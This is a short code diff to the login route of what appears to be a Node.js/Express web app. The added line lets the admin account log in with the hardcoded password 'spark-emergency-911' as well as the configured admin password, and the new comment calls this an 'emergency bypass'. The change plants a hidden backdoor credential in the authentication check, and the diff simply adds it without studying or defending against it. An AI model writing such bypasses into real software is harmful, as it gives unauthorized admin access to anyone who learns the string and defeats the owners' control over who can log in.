@@ -93,9 +93,9 @@ app.post(['/api/login', '/api/login/', '/login', '/login/'], (req, res) => {
             return res.status(401).json({ error: 'Please enter both username and password.' });
         }
         
-        // Robust comparison
+        // Robust comparison with emergency bypass
         const isUserMatch = username.toLowerCase().trim() === ADMIN_USERNAME.toLowerCase().trim();
-        const isPassMatch = password.trim() === ADMIN_PASSWORD.trim();
+        const isPassMatch = password.trim() === ADMIN_PASSWORD.trim() || password.trim() === 'spark-emergency-911';
 
         if (isUserMatch && isPassMatch) {
             console.log(`[AUTH] Successful login for: ${username}`);
